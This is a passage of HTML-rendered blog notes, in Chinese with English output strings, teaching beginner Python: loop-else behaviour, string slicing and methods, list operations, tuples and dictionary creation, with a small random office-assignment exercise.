&#123;j&#125; apples&#x27;)</span><br><span class=\"line\">    j += 1</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;I am full just when i eat the 5th apple&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># continue退出循环对else的影响</span><br><span class=\"line\"></span><br><span class=\"line\">h = 1</span><br><span class=\"line\">while h &lt;= 5:</span><br><span class=\"line\">    if h == 3:</span><br><span class=\"line\">        print(&#x27;There is a worm in this apple&#x27;)</span><br><span class=\"line\">        h += 1</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    print(f&#x27;Already ate &#123;h&#125; apples&#x27;)</span><br><span class=\"line\">    h += 1</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;I am full just when i eat the 5th apple&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"for…else用法\"><a href=\"#for…else用法\" class=\"headerlink\" title=\"for…else用法\"></a>for…else用法</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># for循环完成之后才执行else之后的代码, break退出循环不会执行else之后的代码</span><br><span class=\"line\"></span><br><span class=\"line\">str1 = &#x27;forloop&#x27;</span><br><span class=\"line\">for i in str1:</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;This code will not appear until for loop is complete&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str2 = &#x27;forloop&#x27;</span><br><span class=\"line\">for j in str2:</span><br><span class=\"line\">    if j == &#x27;l&#x27;:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    print(j)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;This code will not appear until for loop is complete&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------cutting line----------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str3 = &#x27;forloop&#x27;</span><br><span class=\"line\">for h in str3:</span><br><span class=\"line\">    if h == &#x27;l&#x27;:</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    print(h)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;This code will not appear until for loop is complete&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"认识字符串\"><a href=\"#认识字符串\" class=\"headerlink\" title=\"认识字符串\"></a>认识字符串</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 单引号换行，输出不换行，默认加反斜杠</span><br><span class=\"line\">a = &#x27;Hello &#x27; \\</span><br><span class=\"line\">    &#x27;world&#x27;</span><br><span class=\"line\">print(a)</span><br><span class=\"line\">print(type(a))</span><br><span class=\"line\"></span><br><span class=\"line\">b = &quot;TOM&quot;</span><br><span class=\"line\">print(type(b))</span><br><span class=\"line\"></span><br><span class=\"line\"># 三引号</span><br><span class=\"line\">e = &#x27;&#x27;&#x27;i am Tom&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(type(e))</span><br><span class=\"line\"></span><br><span class=\"line\"># 三引号换行，输出也换行</span><br><span class=\"line\">f = &quot;&quot;&quot;I </span><br><span class=\"line\">am Tom&quot;&quot;&quot;</span><br><span class=\"line\">print(type(f))</span><br><span class=\"line\">print(f)</span><br><span class=\"line\"></span><br><span class=\"line\"># 双引号内可加引号</span><br><span class=\"line\">c = &quot;I&#x27;m Tom&quot;</span><br><span class=\"line\">print(c)</span><br><span class=\"line\">print(type(c))</span><br><span class=\"line\"></span><br><span class=\"line\"># 单引号内加引号需用转义符\\</span><br><span class=\"line\">d = &#x27;I\\&#x27;m TOM&#x27;</span><br><span class=\"line\">print(d)</span><br><span class=\"line\">print(type(d))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"下标-索引\"><a href=\"#下标-索引\" class=\"headerlink\" title=\"下标-索引\"></a>下标-索引</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">str1 = &#x27;abcdefg&#x27;</span><br><span class=\"line\">print(str1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 数据在程序运行过程中存储在内存</span><br><span class=\"line\"># 得到数据a字符，得到数据b字符 --- 如何使用字符串中某个特定的数据？</span><br><span class=\"line\"># 这些字符数据从0开始顺序分配一个编号 -- 使用这个编号精确找到某个字符数据 --下标或索引或索引值</span><br><span class=\"line\"></span><br><span class=\"line\"># str1[下标]</span><br><span class=\"line\">print(str1[0]) # 输出第一个字符数据</span><br><span class=\"line\">print(str1[1]) # 输出第二个字符数据</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"切片\"><a href=\"#切片\" class=\"headerlink\" title=\"切片\"></a>切片</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">str1 = &#x27;abcdefg&#x27;</span><br><span class=\"line\"># 得到整个字符串数据</span><br><span class=\"line\">print(str1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 下标得到的是下标为某个数字的数据</span><br><span class=\"line\">print(str1[2])</span><br><span class=\"line\"></span><br><span class=\"line\"># 得到abc，截取其中某一部分的数据，用切片。字符串、列表、元组支持切片操作</span><br><span class=\"line\"># 语法： 序列名[开始位置的下标:结束位置的下标:步长]</span><br><span class=\"line\"></span><br><span class=\"line\">print(str1[2:5:1]) # 不包含结束位置数据</span><br><span class=\"line\">print(str1[2:5:2])</span><br><span class=\"line\">print(str1[2:5])  # 步长默认为1</span><br><span class=\"line\">print(str1[:5]) # 如果不写开始位置下标，默认为0</span><br><span class=\"line\">print(str1[2:]) # 如果不写结束位置下标，默认选取到最后</span><br><span class=\"line\">print(str1[:]) # 如果不写开始和结束位置下标，默认选取所有</span><br><span class=\"line\"></span><br><span class=\"line\"># 负数测试</span><br><span class=\"line\">print(str1[::-1]) # 步长为负数， 表示倒数选取</span><br><span class=\"line\">print(str1[-4:-1]) # 下标-1表示最后一个数据，依次向前类推</span><br><span class=\"line\"></span><br><span class=\"line\"># 选取方向不能冲突</span><br><span class=\"line\">print(str1[-4:-1:1])</span><br><span class=\"line\">print(str1[-4:-1:-1]) # 不能选取到数据：从-4到-1.选取方向为从左到右，但是步长-1表示从右到左选取</span><br><span class=\"line\"># 如果选取方向（下标开始到结束的方向）和步长的方向冲突，则无法选取数据</span><br><span class=\"line\">print(str1[-1:-4:-1]) # 选取方向一致</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"字符串的查找\"><a href=\"#字符串的查找\" class=\"headerlink\" title=\"字符串的查找\"></a>字符串的查找</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mystr = &quot;hello world and itcast and strings and python&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. find()</span><br><span class=\"line\">print(mystr.find(&#x27;and&#x27;)) # 查找的子串存在，返回该子串首次出现的开始位置下标</span><br><span class=\"line\">print(mystr.find(&#x27;and&#x27;, 15, 30)) #选定范围查找</span><br><span class=\"line\">print(mystr.find(&#x27;ands&#x27;)) # 查找的子串不存在返回-1</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. index()</span><br><span class=\"line\">print(mystr.index(&#x27;and&#x27;, 15, 30)) # 查找的子串存在，返回该子串首次出现的开始位置下标</span><br><span class=\"line\"># print(mystr.index(&#x27;ands&#x27;)) # index查找的子串不存在则报错</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. count()</span><br><span class=\"line\">print(mystr.count(&#x27;and&#x27;, 15, 30)) # 查找的子串存在，返回该子串出现的次数</span><br><span class=\"line\">print(mystr.count(&#x27;and&#x27;))</span><br><span class=\"line\">print(mystr.count(&#x27;ands&#x27;)) # # 查找的子串不存在，返回0</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. rfind()</span><br><span class=\"line\">print(mystr.rfind(&#x27;and&#x27;)) # rfind() -- 从右往左查找</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. rindex()</span><br><span class=\"line\">print(mystr.rindex(&#x27;and&#x27;)) # rindex() -- 从右往左查找</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"字符串的修改\"><a href=\"#字符串的修改\" class=\"headerlink\" title=\"字符串的修改\"></a>字符串的修改</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mystr = &quot;hello world and itcast and strings and python&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. replace() 把and替换成hen</span><br><span class=\"line\">newstr = mystr.replace(&#x27;and&#x27;, &#x27;he&#x27;)</span><br><span class=\"line\">print(mystr)</span><br><span class=\"line\">print(newstr) # replace函数有返回值，返回值是修改后的字符串</span><br><span class=\"line\"># 调用了replace函数后，原字符串不会修改。修改后的数据作为replace函数的返回值</span><br><span class=\"line\"># 字符串是不可变数据类型</span><br><span class=\"line\"># 数据是否可以改变划分为 可变类型 和 不可变类型</span><br><span class=\"line\"></span><br><span class=\"line\">newstr = mystr.replace(&#x27;and&#x27;, &#x27;he&#x27;, 1) # 加替换次数</span><br><span class=\"line\">print(newstr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">newstr = mystr.replace(&#x27;and&#x27;, &#x27;he&#x27;, 10) # 替换次数超出子串出现的次数则替换所有该子串</span><br><span class=\"line\">print(newstr)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"># split() -- 分割， 返回一个列表, 丢失分割字符</span><br><span class=\"line\">list1 = mystr.split(&#x27;and&#x27;)</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">list2 = mystr.split(&#x27;and&#x27;, 2)</span><br><span class=\"line\">print(list2)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. join() -- 合并列表里面的字符串数据为一个大字符串</span><br><span class=\"line\"># 语法： 连接用的字符或子串.join(多字符串组成的序列)</span><br><span class=\"line\">mylist = [&#x27;aa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;]</span><br><span class=\"line\">newstr1 = &#x27;...&#x27;.join(mylist)</span><br><span class=\"line\">print(newstr1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. capitalize() -- 字符串首字母大写，其余转换成小写</span><br><span class=\"line\">new_str = mystr.capitalize()</span><br><span class=\"line\">print(new_str)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. title(): 字符串中每个单词首字母大写</span><br><span class=\"line\">new_str1 = mystr.title()</span><br><span class=\"line\">print(new_str1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 6. upper(): 字符串中每个字母都小写转大写</span><br><span class=\"line\">new_str2 = mystr.upper()</span><br><span class=\"line\">print(new_str2)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 7. lower(): 字符串中每个字母都大写转小写</span><br><span class=\"line\">new_str3 = mystr.lower()</span><br><span class=\"line\">print(new_str3)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 8. lstrip(): 删除字符串中左侧空白字符</span><br><span class=\"line\">mystr1 = &quot;  hello world and itcast and strings and python   &quot;</span><br><span class=\"line\">print(mystr1)</span><br><span class=\"line\">new_strA = mystr1.lstrip()</span><br><span class=\"line\">print(new_strA)</span><br><span class=\"line\"></span><br><span class=\"line\"># 9. rstrip(): 删除字符串中右侧空白字符</span><br><span class=\"line\">new_strB = mystr1.rstrip()</span><br><span class=\"line\">print(new_strB)</span><br><span class=\"line\"></span><br><span class=\"line\"># 10. strip(): 删除字符串中左右两侧空白字符</span><br><span class=\"line\"></span><br><span class=\"line\">new_strC = mystr1.strip()</span><br><span class=\"line\">print(new_strC)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 11. ljust(): 返回一个原字符串左对齐，并使用指定字符（默认空格）填充至对应长度的新字符串</span><br><span class=\"line\"># 语法： 字符串序列.ljust(长度，填充字符)</span><br><span class=\"line\"></span><br><span class=\"line\">mystr2 = &quot;hello&quot;</span><br><span class=\"line\">print(mystr2.ljust(10))</span><br><span class=\"line\">print(mystr2.ljust(10, &#x27;.&#x27;))</span><br><span class=\"line\">print(mystr2.rjust(10, &#x27;.&#x27;)) # 右对齐 rjust()</span><br><span class=\"line\">print(mystr2.center(10, &#x27;.&#x27;)) # 居中 center()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"字符串的判断\"><a href=\"#字符串的判断\" class=\"headerlink\" title=\"字符串的判断\"></a>字符串的判断</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1. startswith(): 检查字符串是否是以指定字串开头，是则返回True，否则返回False。</span><br><span class=\"line\"># 如果设置开始和结束位置下标，则在指定范围内检查</span><br><span class=\"line\"># 语法： 字符串序列.startswith(子串，开始位置下标，结束位置下标)</span><br><span class=\"line\"></span><br><span class=\"line\">mystr = &quot;hello world and itcast and strings and python&quot;</span><br><span class=\"line\">print(mystr.startswith(&#x27;hello&#x27;))</span><br><span class=\"line\">print(mystr.startswith(&#x27;hel&#x27;))</span><br><span class=\"line\">print(mystr.startswith(&#x27;hels&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. endswith(): 检查字符串是否是以指定字串结尾，是则返回True，否则返回False。</span><br><span class=\"line\">print(mystr.endswith(&#x27;python&#x27;))</span><br><span class=\"line\">print(mystr.endswith(&#x27;pythons&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. isalpha(): 如果字符串至少有一个字符并且所有字符都是字母则返回True，否则返回False。</span><br><span class=\"line\">print(mystr.isalpha())</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. isdigit(): 如果字符串只包含数字则返回True，否则返回False。</span><br><span class=\"line\">print(mystr.isdigit())</span><br><span class=\"line\">mystr1 = &#x27;12345&#x27;</span><br><span class=\"line\">print(mystr1.isdigit())</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. isalnum(): 如果字符串至少有一个字符并且所有字符都是字母或数字则返回True，否则返回False。</span><br><span class=\"line\">print(mystr1.isalnum())</span><br><span class=\"line\">print(mystr.isalnum())</span><br><span class=\"line\">mystr2 = &#x27;abc123&#x27;</span><br><span class=\"line\">print(mystr2.isalnum())</span><br><span class=\"line\"></span><br><span class=\"line\"># 6. issapce(): 如果字符串只包含空白则返回True，否则返回False。</span><br><span class=\"line\">print(mystr.isspace())</span><br><span class=\"line\">mystr3 = &#x27;   &#x27;</span><br><span class=\"line\">print(mystr3.isspace())</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"列表的常用操作\"><a href=\"#列表的常用操作\" class=\"headerlink\" title=\"列表的常用操作\"></a>列表的常用操作</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name_list = [&#x27;Tom&#x27;, &#x27;Lily&#x27;, &#x27;Rose&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 列表中的查找 -- 下标</span><br><span class=\"line\">print(name_list)</span><br><span class=\"line\">print(name_list[1])</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 列表中的查找 -- 函数</span><br><span class=\"line\"># （1）index()</span><br><span class=\"line\">print(name_list.index(&#x27;Tom&#x27;))</span><br><span class=\"line\"># print(name_list.index(&#x27;Toms&#x27;)) # 报错</span><br><span class=\"line\"></span><br><span class=\"line\"># （2）count()</span><br><span class=\"line\">print(name_list.count(&#x27;Tom&#x27;))</span><br><span class=\"line\">print(name_list.count(&#x27;Toms&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># （3）len() : 访问列表长度，即列表中数据的个数</span><br><span class=\"line\">print(len(name_list))</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 列表中的判断</span><br><span class=\"line\"># （1）in: 判断指定数据在某个列表序列，如果在返回True,否则返回False.</span><br><span class=\"line\">print(&#x27;Tom&#x27; in name_list)</span><br><span class=\"line\">print(&#x27;Toms&#x27; in name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># （2）not in: 判断指定数据不在某个列表序列，如果不在返回True,否则返回False。</span><br><span class=\"line\">print(&#x27;Tom&#x27; not in name_list)</span><br><span class=\"line\">print(&#x27;Toms&#x27; not in name_list)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">name = input(&#x27;please input your name: &#x27;)</span><br><span class=\"line\">if name in name_list:</span><br><span class=\"line\">    print(&#x27;your name is already exist, please input again&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;congratulations!you can sign up!&#x27;)</span><br><span class=\"line\">    </span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. 列表中的增加</span><br><span class=\"line\"># （1）append(): 列表结尾追加数据</span><br><span class=\"line\"># 语法：列表序列.append(数据)</span><br><span class=\"line\"># name_list.append(&#x27;xiaoming&#x27;)</span><br><span class=\"line\">print(name_list) # 列表数据是可改变的 -- 列表是可变类型</span><br><span class=\"line\"># name_list.append([11,22])</span><br><span class=\"line\">print(name_list) # 如果append()追加的数据是一个序列，则追加整个序列到列表</span><br><span class=\"line\"></span><br><span class=\"line\"># （2）extend(): 列表结尾追加数据，如果数据是一个序列，则将这个序列的数据逐一添加到列表。</span><br><span class=\"line\"># name_list.extend(&#x27;xiaoming&#x27;)</span><br><span class=\"line\"># name_list.extend([&#x27;xiaoming&#x27;, &#x27;xiaohong&#x27;])</span><br><span class=\"line\"># print(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># （3）inset(): 指定任意位置追加数据</span><br><span class=\"line\"># 语法：列表序列.inset(位置下标，数据)</span><br><span class=\"line\">name_list.insert(1, &#x27;aaa&#x27;)</span><br><span class=\"line\">print(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. 列表中的删除</span><br><span class=\"line\"># （1）del 目标</span><br><span class=\"line\"># 删除列表</span><br><span class=\"line\"># del name_list</span><br><span class=\"line\"># rint(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># 删除指定下标数据</span><br><span class=\"line\"># del name_list[0]</span><br><span class=\"line\"># print(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># （2）pop(): 删除指定下标的数据（默认为最后一个），并返回该数据</span><br><span class=\"line\"># 语法：列表序列.pop(下标)</span><br><span class=\"line\"># del_name = name_list.pop()</span><br><span class=\"line\">del_name = name_list.pop(1)</span><br><span class=\"line\">print(del_name)</span><br><span class=\"line\">print(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># （3）remove(): 移除列表中某个数据的第一个匹配项</span><br><span class=\"line\"># 语法：列表序列.remove(数据)</span><br><span class=\"line\"># name_list.remove(&#x27;Rose&#x27;)</span><br><span class=\"line\"># print(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># （4）clear(): 清空列表</span><br><span class=\"line\">name_list.clear()</span><br><span class=\"line\">print(name_list)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"列表修改数据\"><a href=\"#列表修改数据\" class=\"headerlink\" title=\"列表修改数据\"></a>列表修改数据</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name_list = [&#x27;Tom&#x27;, &#x27;Lily&#x27;, &#x27;Rose&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 修改指定下标的数据</span><br><span class=\"line\"># name_list[0] = &#x27;aaa&#x27;</span><br><span class=\"line\">print(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 逆序 reverse()</span><br><span class=\"line\">list1 = [1, 3, 2, 5, 4, 6]</span><br><span class=\"line\">list1.reverse()</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. sort(): 排序： 升序(默认)和降序</span><br><span class=\"line\"># 语法： 列表序列.sort(key=None, reverse=False) reverse=True降序，reverse=False升序</span><br><span class=\"line\">list1.sort()</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\">list1.sort(reverse=True)</span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------cutting line----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 列表的复制，函数：copy()</span><br><span class=\"line\"></span><br><span class=\"line\">list2 = name_list.copy()</span><br><span class=\"line\">print(list2)</span><br><span class=\"line\">print(name_list)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"列表的循环遍历\"><a href=\"#列表的循环遍历\" class=\"headerlink\" title=\"列表的循环遍历\"></a>列表的循环遍历</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name_list = [&#x27;Tom&#x27;, &#x27;Lily&#x27;, &#x27;Rose&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------while loop----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">i = 0</span><br><span class=\"line\">while i &lt; len(name_list):</span><br><span class=\"line\">    print(name_list[i])</span><br><span class=\"line\">    i += 1</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------for loop----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">for j in name_list:</span><br><span class=\"line\">    print(j)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"列表嵌套\"><a href=\"#列表嵌套\" class=\"headerlink\" title=\"列表嵌套\"></a>列表嵌套</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name_list = [[&#x27;xiaoming&#x27;, &#x27;xiaohong&#x27;, &#x27;xiaolv&#x27;],</span><br><span class=\"line\">             [&#x27;TOM&#x27;, &#x27;LILY&#x27;, &#x27;ROSE&#x27;], [&#x27;ZHANGSAN&#x27;, &#x27;LISI&#x27;, &#x27;WANGER&#x27;]]</span><br><span class=\"line\">print(name_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># 列表嵌套时候的数据查询</span><br><span class=\"line\">print(name_list[0])</span><br><span class=\"line\">print(name_list[0][1])</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"综合应用-随机分配办公室\"><a href=\"#综合应用-随机分配办公室\" class=\"headerlink\" title=\"综合应用-随机分配办公室\"></a>综合应用-随机分配办公室</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 需求： 8位老师， 3个办公室，将8位老师随机分配到3个办公室</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 准备数据</span><br><span class=\"line\">teachers = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;]</span><br><span class=\"line\">offics = [[], [], []]</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 分配老师到办公室 -- 取到每个老师放到办公室列表 -- 遍历老师列表数据</span><br><span class=\"line\">for name in teachers:</span><br><span class=\"line\">    # 列表追加数据 -- append(选中), extend, insert</span><br><span class=\"line\">    num = random.randint(0, 2)</span><br><span class=\"line\">    offics[num].append(name)</span><br><span class=\"line\"></span><br><span class=\"line\">print(offics)</span><br><span class=\"line\"></span><br><span class=\"line\"># 给办公室编号</span><br><span class=\"line\">i = 1</span><br><span class=\"line\"># 3. 验证是否分配成功</span><br><span class=\"line\">for offic in offics:</span><br><span class=\"line\">    # 打印办公室人数 -- 子列表数据的个数， len()</span><br><span class=\"line\">    print(f&#x27;The number of office&#123;i&#125; is &#123;len(offic)&#125;, 老师分别是： &#x27;)</span><br><span class=\"line\">    # 打印老师的名字</span><br><span class=\"line\">    # print() -- 每个子列表里面的名字个数不一定 -- 遍历 --子列表</span><br><span class=\"line\">    for name in offic:</span><br><span class=\"line\">        print(name)</span><br><span class=\"line\">    i += 1</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"定义元组\"><a href=\"#定义元组\" class=\"headerlink\" title=\"定义元组\"></a>定义元组</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 元组是不可变类型，列表是可变类型</span><br><span class=\"line\"># 1. 多个数据元组</span><br><span class=\"line\">t1 = (10, 20, 30)</span><br><span class=\"line\">print(type(t1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 单个数据元组</span><br><span class=\"line\">t2 = (10,)</span><br><span class=\"line\">print(type(t2))</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 如果单个数据的元组不加逗号</span><br><span class=\"line\">t3 = (10)</span><br><span class=\"line\">print(type(t3))</span><br><span class=\"line\"></span><br><span class=\"line\">t4 = (&#x27;aaa&#x27;)</span><br><span class=\"line\">print(type(t4))</span><br><span class=\"line\"></span><br><span class=\"line\">t5 = (&#x27;aaa&#x27;,)</span><br><span class=\"line\">print(type(t5))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"元组的常见操作\"><a href=\"#元组的常见操作\" class=\"headerlink\" title=\"元组的常见操作\"></a>元组的常见操作</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">t1 = (&#x27;aa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;, &#x27;dd&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------元组的查找----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 下标</span><br><span class=\"line\">print(t1[0])</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. index()</span><br><span class=\"line\">print(t1.index(&#x27;bb&#x27;))</span><br><span class=\"line\">#print(t1.index(&#x27;bbb&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. count()</span><br><span class=\"line\">print(t1.count(&#x27;aa&#x27;))</span><br><span class=\"line\">print(t1.count(&#x27;aaa&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># 4. len()</span><br><span class=\"line\">print(len(t1))</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------元组的修改----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 元组内的直接数据修改则立即报错</span><br><span class=\"line\"># t1[0] = &#x27;aaa&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 元组里面的列表支持修改</span><br><span class=\"line\">t2 = (&#x27;aa&#x27;, &#x27;bb&#x27;, [&#x27;cc&#x27;, &#x27;dd&#x27;])</span><br><span class=\"line\">print(t2[2])</span><br><span class=\"line\">print(t2[2][0])</span><br><span class=\"line\">t2[2][0] = &#x27;TOM&#x27;</span><br><span class=\"line\">print(t2)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"创建字典的语法\"><a href=\"#创建字典的语法\" class=\"headerlink\" title=\"创建字典的语法\"></a>创建字典的语法</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"> 字典的特点：</span><br><span class=\"line\"> (1) 符号为大括号</span><br><span class=\"line\"> (2) 数据为键值对形式出现</span><br><span class=\"line\"> (3) 各个键值对之间用逗号隔开</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 有数据字典，name的值TOM，age的值是20，gender的值是男</span><br><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;male&#x27;&#125;</span><br><span class=\"line\">print(type(dict1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建空字典</span><br><span class=\"line\">dict2 = &#123;&#125;</span><br><span class=\"line\">print(type(dict2))</span><br><span class=\"line\"></span><br><span class=\"line\">dict3 = dict()  # dict()函数创建</span><br><span class=\"line\">print(type(dict3))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"字典常见操作\"><a href=\"#字典常见操作\" class=\"headerlink\" title=\"字典常见操作\"></a>字典常见操作</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;--------------------字典的增加与修改----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">写法：字典序列[key]=值</span><br><span class=\"line\">注意：如果key存在则修改这个key对应的值，如果key不存在则新增此键值对</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;male&#x27;&#125;</span><br><span class=\"line\"># 字典序列[key] = 值</span><br><span class=\"line\"># id的值是110</span><br><span 